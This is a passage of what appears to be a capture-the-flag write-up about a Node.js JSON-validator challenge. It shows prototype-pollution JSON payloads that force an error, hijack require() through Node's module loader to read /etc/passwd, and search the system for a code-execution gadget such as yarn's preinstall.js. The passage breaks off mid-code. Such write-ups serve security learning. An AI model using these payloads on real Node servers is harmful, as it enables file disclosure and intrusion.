    <span class="token keyword">const</span> json <span class="token operator">=</span> process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\?(.*?)\ </span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">?.</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">JSON: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>json<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">, Object:</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./index'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">{</span>
    <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./usage'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token keyword">finally</span><span class="token punctuation">{</span>
    process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token comment">//usage.js</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Validate your JSON with &lt;a href="/?{}">query&lt;/a>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<p>Also of note, a Dockerfile is provided for local debugging:</p>
<div class="gatsby-highlight" data-language="dockerfile"><pre class="language-dockerfile"><code class="language-dockerfile"><span class="token instruction"><span class="token keyword">from</span> node:18.8.0-alpine3.16</span>
<span class="token instruction"><span class="token keyword">MAINTAINER</span> ginoah</span>

<span class="token instruction"><span class="token keyword">RUN</span> apk add gcc musl-dev socat</span>

<span class="token instruction"><span class="token keyword">COPY</span> ./readflag.c /readflag.c</span>
<span class="token instruction"><span class="token keyword">COPY</span> flag /flag</span>
<span class="token instruction"><span class="token keyword">RUN</span> chmod 0400 /flag &amp;&amp; chown root:root /flag</span>
<span class="token instruction"><span class="token keyword">RUN</span> chmod 0444 /readflag.c &amp;&amp; gcc /readflag.c -o /readflag</span>
<span class="token instruction"><span class="token keyword">RUN</span> chown root:root /readflag &amp;&amp; chmod 4555 /readflag</span>

<span class="token instruction"><span class="token keyword">WORKDIR</span> /app</span>
<span class="token instruction"><span class="token keyword">COPY</span> ./src/server.js ./</span>
<span class="token instruction"><span class="token keyword">COPY</span> ./src/index.js ./</span>
<span class="token instruction"><span class="token keyword">COPY</span> ./src/usage.js ./</span>

<span class="token instruction"><span class="token keyword">USER</span> nobody</span>
<span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">"socat"</span>, <span class="token string">"TCP-LISTEN:1337,reuseaddr,fork"</span>, <span class="token string">"EXEC:'./server.js'"</span>]</span></code></pre></div>
<p>As the source code is so small, it is very easy to analyze. When the server receives a request, it attempts to parse the entire query string as JSON. After doing so, it calls the <code class="language-text">index.js</code> function on the parsed object and an empty object, which merges the two objects. This is a very obvious prototype pollution vulnerability which does not need any further explanation. Lastly, the parsed JSON and merged object are displayed to the user.</p>
<p>If any of the above functions error, <code class="language-text">usage.js</code> is <code class="language-text">require()</code>‘d, which will display the intended usage to the user.</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 551px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/e6259eaae5fc433452c2d124483f7379/db783/usage.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 18.9873417721519%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAApUlEQVQI143I2wqCMAAA0H1LITMxL0gyhVLrwT7Ky+bcpkg/KWSmE5/qLesHgjqPB/j7E/KjQxiHx3MQxS4KkB+5XuB6gWa4qmpDaK+hqUALbpytiXTL0/SdqjkrxQCYMFIILhpRXbhocsIw4WXZUNrgQmDMcc6SjKYZzQmnZU1ojWmVY5akFLRtK8dRSjkM9667ymnq+37uH/Pt+f4FfN3ltfzjAzLNoCevQEqqAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="usage"
        title="usage"
        src="/static/e6259eaae5fc433452c2d124483f7379/db783/usage.png"
        srcset="/static/e6259eaae5fc433452c2d124483f7379/c26ae/usage.png 158w,
/static/e6259eaae5fc433452c2d124483f7379/6bdcf/usage.png 315w,
/static/e6259eaae5fc433452c2d124483f7379/db783/usage.png 551w"
        sizes="(max-width: 551px) 100vw, 551px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
  </a>
    </span></p>
<h1 id="arbitrary-local-file-inclusion" style="position:relative;"><a href="#arbitrary-local-file-inclusion" aria-label="arbitrary local file inclusion permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Arbitrary Local File Inclusion</h1>
<h2 id="forcing-an-error" style="position:relative;"><a href="#forcing-an-error" aria-label="forcing an error permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Forcing An Error</h2>
<p>It is immediately clear that the goal is to find a prototype pollution gadget which can achieve RCE when the rest of the code runs. Initially, my brain was not functioning properly and I began to look for gadgets within <code class="language-text">console.log()</code> and <code class="language-text">process.exit()</code> before my teammate pointed out that we could reach the <code class="language-text">require()</code> after prototype pollution if we can get <code class="language-text">console.log()</code> to error, as it is not evaluated until after the <code class="language-text">index.js</code> function.</p>
<p>To do so, we can include a format specifier in the JSON, and pollute the <code class="language-text">toString()</code> method, like so:</p>
<div class="gatsby-highlight" data-language="json"><pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"%d"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">"toString"</span><span class="token operator">:</span> <span class="token null keyword">null</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre></div>
<p>Providing the above payload to our local debugging instance confirms that we can reach the catch block.</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/613f85d9ee3e17c2ec6e8e6b3da98c91/d0e73/error.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 44.93670886075949%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABN0lEQVQoz3WQ226DMAxA+ZKNOIFAc3EukCtQqLr9/ydNbN360klHli352JabkI6Y9jlsMR/GFaGD1FGoINQ8XBwwRTsNTL2kqevHst6X7bOud+ur1IGPjo+uHyzrsQXxn3nKxlU/LWgzuqIwdtzQTnccWY8dNz8lofK1PIVrXe4x7bkcudxyuc3pOk2L9TXmPabd+tJzQ+CF33TcSFdNvYmw6XzYvI++gvBMBaYCPeNMxUTEBBcHowNunjJhqr34d5NajC3Gdx1bHYlJDzC1NhNMxBaCEXoE9vxfA50eTTbl0HET04pxV2EDHZktcl6FK9IVJvy5sEeg8sFDZuq8zVfqCjWJYaKukO9tYDLFSHUgciZygtGeI/7osbmoEMpN++Wt08AN+QaGs4/0SAZDuD3L4dd85vgF9zpekf2rSJMAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="making console.log() error"
        title="making console.log() error"
        src="/static/613f85d9ee3e17c2ec6e8e6b3da98c91/f058b/error.png"
        srcset="/static/613f85d9ee3e17c2ec6e8e6b3da98c91/c26ae/error.png 158w,
/static/613f85d9ee3e17c2ec6e8e6b3da98c91/6bdcf/error.png 315w,
/static/613f85d9ee3e17c2ec6e8e6b3da98c91/f058b/error.png 630w,
/static/613f85d9ee3e17c2ec6e8e6b3da98c91/d0e73/error.png 671w"
        sizes="(max-width: 630px) 100vw, 630px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
  </a>
    </span></p>
<h2 id="hijacking-the-require-for-local-file-inclusion" style="position:relative;"><a href="#hijacking-the-require-for-local-file-inclusion" aria-label="hijacking the require for local file inclusion permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Hijacking The Require For Local File Inclusion</h2>
<p>The real fun begins after achieving both prototype pollution prior and a <code class="language-text">require()</code>.</p>
<p>Some great gadgets and ideas are showcased in the <a href="https://arxiv.org/abs/2207.11171">Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js
</a> research paper. One of which involves loading arbitrary local files when a relative path is <code class="language-text">require()</code>‘d:</p>
<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token comment">// Example from research paper linked above</span>
<span class="token keyword">let</span> rootProto <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span>
rootProto<span class="token punctuation">[</span><span class="token string">"exports"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string-property property">"."</span><span class="token operator">:</span><span class="token string">"./changelog.js"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
rootProto<span class="token punctuation">[</span><span class="token string">"1"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/path/to/npm/scripts/"</span><span class="token punctuation">;</span>
<span class="token comment">// trigger call</span>
<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./target.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<p>However, this gadget does not seem to work for us. We instead found an additional but similar prototype pollution gadget that will achieve the same result. The function we are targeting is found <a href="https://github.com/nodejs/node/blob/v18.8.0/lib/internal/modules/cjs/loader.js#L451-L476">here</a>:</p>
<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">trySelf</span><span class="token punctuation">(</span><span class="token parameter">parentPath<span class="token punctuation">,</span> request</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>parentPath<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> <span class="token punctuation">{</span> <span class="token literal-property property">data</span><span class="token operator">:</span> pkg<span class="token punctuation">,</span> <span class="token literal-property property">path</span><span class="token operator">:</span> pkgPath <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">readPackageScope</span><span class="token punctuation">(</span>parentPath<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pkg <span class="token operator">||</span> pkg<span class="token punctuation">.</span>exports <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> pkg<span class="token punctuation">.</span>name <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

  <span class="token keyword">let</span> expansion<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token operator">===</span> pkg<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    expansion <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">StringPrototypeStartsWith</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>pkg<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    expansion <span class="token operator">=</span> <span class="token string">'.'</span> <span class="token operator">+</span> <span class="token function">StringPrototypeSlice</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> pkg<span class="token punctuation">.</span>name<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">finalizeEsmResolution</span><span class="token punctuation">(</span><span class="token function">packageExportsResolve</span><span class="token punctuation">(</span>
      <span class="token function">pathToFileURL</span><span class="token punctuation">(</span>pkgPath <span class="token operator">+</span> <span class="token string">'/package.json'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> expansion<span class="token punctuation">,</span> pkg<span class="token punctuation">,</span>
      <span class="token function">pathToFileURL</span><span class="token punctuation">(</span>parentPath<span class="token punctuation">)</span><span class="token punctuation">,</span> cjsConditions<span class="token punctuation">)</span><span class="token punctuation">,</span> parentPath<span class="token punctuation">,</span> pkgPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token string">'ERR_MODULE_NOT_FOUND'</span><span class="token punctuation">)</span>
      <span class="token keyword">throw</span> <span class="token function">createEsmNotFoundErr</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> pkgPath <span class="token operator">+</span> <span class="token string">'/package.json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">throw</span> e<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre></div>
<p>If we pollute <code class="language-text">data</code> and <code class="language-text">path</code>, we will have control over <code class="language-text">pkg</code> and <code class="language-text">pkgPath</code> respectively.</p>
<p>After some tweaking of the above example, we are able to control the file path to be loaded.</p>
<p>We confirm <code class="language-text">/etc/passwd</code> is loaded by the given error message displaying the first line of the file:</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 569px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/4726ff19e6d198971c93df8ca23d0eb2/854dc/lfi.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 49.36708860759494%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABUUlEQVQoz32QWU7EMBBEcxNmsntrt5c4dlbPRgAh7n8c5CAQAs1I9eOPLr96WTy/zes2r9saNw6Oyx71SLktKigqkZePkmk7c3CoB0CvzYRm1HYydkI9NkQfC34sRV7B75uiEl+9mbEzE50yE6CXKkg9YMoo9QjSlxWUtTzm7JCzVLTn8P3MEvNym+PLtG7LusXT6zBdTtc35+MwXS63dz9dbL9IDJTbukXCDOpR25lxm6lu8SFScGY8U+x9ODsffTil2TW0omvQEfRcdDVRxQ7SENUQXdYyI+iFClw4yizqgXJ7yFlZy7KCBJmnJM4d+GvzD3/Wh3M8vS7xxbol7efdXqyqRub/VP21LaQH7E23gPSEGQ69kL2QnlDztFt5dJwMq0CZ5dBLFQg1HByg53sFoK8aWdz5P7s+f6Ae6lYRZigzTZtkUG5bqhuSUtwn/wRXuGt3ZlOqbgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="/etc/passwd lfi"
        title="/etc/passwd lfi"
        src="/static/4726ff19e6d198971c93df8ca23d0eb2/854dc/lfi.png"
        srcset="/static/4726ff19e6d198971c93df8ca23d0eb2/c26ae/lfi.png 158w,
/static/4726ff19e6d198971c93df8ca23d0eb2/6bdcf/lfi.png 315w,
/static/4726ff19e6d198971c93df8ca23d0eb2/854dc/lfi.png 569w"
        sizes="(max-width: 569px) 100vw, 569px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
  </a>
    </span></p>
<p>We then combine the LFI gadget with our earlier payload to achieve LFI on the server. In the below screenshot, we see no output, which indicates that <code class="language-text">./usage.js</code> was not <code class="language-text">require()</code>‘d, meaning that we successfully modified the path:</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/f2a22ee7ce7cd49b07fb819024c5dcf6/e35ec/lfi-server.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 13.924050632911392%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAc0lEQVQI112KQQ7CIBBFuYoWhpaZAZoyAxpNMV14/xuZ4EabvMX7ed9o61K7ts6pISuxBCqBJJAgy4IbRcXhMK8LbjG3QGWkYurtdX8cUneKCvPqfP4ngc8w3EKykMYnfZN57m9kdT5PLl4mOnG1/Oun+QG5Mx8ErVB11wAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <img
        class="gatsby-resp-image-image"
        alt="LFI on server"
        title="LFI on server"
        src="/static/f2a22ee7ce7cd49b07fb819024c5dcf6/f058b/lfi-server.png"
        srcset="/static/f2a22ee7ce7cd49b07fb819024c5dcf6/c26ae/lfi-server.png 158w,
/static/f2a22ee7ce7cd49b07fb819024c5dcf6/6bdcf/lfi-server.png 315w,
/static/f2a22ee7ce7cd49b07fb819024c5dcf6/f058b/lfi-server.png 630w,
/static/f2a22ee7ce7cd49b07fb819024c5dcf6/e35ec/lfi-server.png 861w"
        sizes="(max-width: 630px) 100vw, 630px"
        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
        loading="lazy"
        decoding="async"
      />
  </a>
    </span></p>
<p>For easier viewing, the current payload is as follows:</p>
<div class="gatsby-highlight" data-language="json"><pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"%d"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">"toString"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
    <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"./usage"</span><span class="token punctuation">,</span>
      <span class="token property">"exports"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"."</span><span class="token operator">:</span> <span class="token string">"./passwd"</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"/etc"</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre></div>
<h1 id="locating-a-gadget" style="position:relative;"><a href="#locating-a-gadget" aria-label="locating a gadget permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Locating A Gadget</h1>
<p>With prototype pollution and LFI achieved, the next step is to locate a local file which can be abused to gain remote code execution. No external modules are installed, so the search begins in the <code class="language-text">/usr/local/lib/node_modules/</code> directory, which includes 877 <code class="language-text">.js</code> files. After spending some time grepping through for <code class="language-text">child_process</code> calls, I was unable to locate any useful gadgets.</p>
<p>In an act of desperation, I searched for <code class="language-text">.js</code> files accross the entire system, which showed 4 additional files in <code class="language-text">/opt/yarn-v1.22.19/</code>.</p>
<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">$ find / -iname *.js 2>/dev/null | grep -v node_modules
/opt/yarn-v1.22.19/lib/cli.js
/opt/yarn-v1.22.19/lib/v8-compile-cache.js
/opt/yarn-v1.22.19/bin/yarn.js
/opt/yarn-v1.22.19/preinstall.js
/app/usage.js
/app/index.js
/app/server.js</code></pre></div>
<p><code class="language-text">/opt/yarn-v1.22.19/preinstall.js</code> turned out to be incredibly promising. The complete file contents are as follows:</p>
<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token comment">// This file is a bit weird, so let me explain with some context: we're working</span>
<span class="token comment">// to implement a tool called "Corepack" in Node. This tool will allow us to</span>
<span class="token comment">// provide a Yarn shim to everyone using Node, meaning that they won't need to</span>
<span class="token comment">// run `npm install -g yarn`.</span>
<span class="token comment">//</span>
<span class="token comment">// Still, we don't want to break the experience of people that already use `npm</span>
<span class="token comment">// install -g yarn`! And one annoying thing with npm is that they install their</span>
<span class="token comment">// binaries directly inside the Node bin/ folder. And Because of this, they</span>
<span class="token comment">// refuse to overwrite binaries when they detect they don't belong to npm. Which</span>
<span class="token comment">// means that, since the "yarn" Corepack symlink belongs to Corepack and not npm,</span>
<span class="token comment">// running `npm install -g yarn` would crash by refusing to override the binary :/</span>
<span class="token comment">//</span>
<span class="token comment">// And thus we have this preinstall script, which checks whether Yarn is being</span>
<span class="token comment">// installed as a global binary, and remove the existing symlink if it detects</span>
<span class="token comment">// it belongs to Corepack. Since preinstall scripts run, in npm, before the global</span>
<span class="token comment">// symlink is created, we bypass this way the ownership check.</span>
<span class="token comment">//</span>
<span class="token comment">// More info:</span>
<span class="token comment">// https://github.com/arcanis/pmm/issues/6</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>npm_config_global<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> cp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> targetPath <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">execFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>execPath<span class="token punctuation">,</span> <span class="token punctuation">[</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>npm_execpath<span class="token punctuation">,</span> <span class="token string">'bin'</span><span class="token punctuation">,</span> <span class="token string">'-g'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
            <span class="token literal-property property">encoding</span><span class="token operator">:</span> <span class="token string">'utf8'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">stdio</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'ignore'</span><span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> <span class="token string">'ignore'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\n</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">var</span> manifest <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./package.json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> binNames <span class="token operator">=</span> <span class="token keyword">typeof</span> manifest<span class="token punctuation">.</span>bin <span class="token operator">===</span> <span class="token string">'string'</span>
            <span class="token operator">?</span> <span class="token punctuation">[</span>manifest<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^@[^\/]+\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
            <span class="token operator">:</span> <span class="token keyword">typeof</span> manifest<span class="token punctuation">.</span>bin <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> manifest<span class="token punctuation">.</span>bin <span class="token operator">!==</span> <span class="token keyword">null</span>
            <span class="token operator">?</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>manifest<span class="token punctuation">.</span>bin<span class="token punctuation">)</span>
            <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        binNames<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">binName</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">var</span> binPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>targetPath<span class="token punctuation">,</span> binName<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">var</span> binTarget<span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
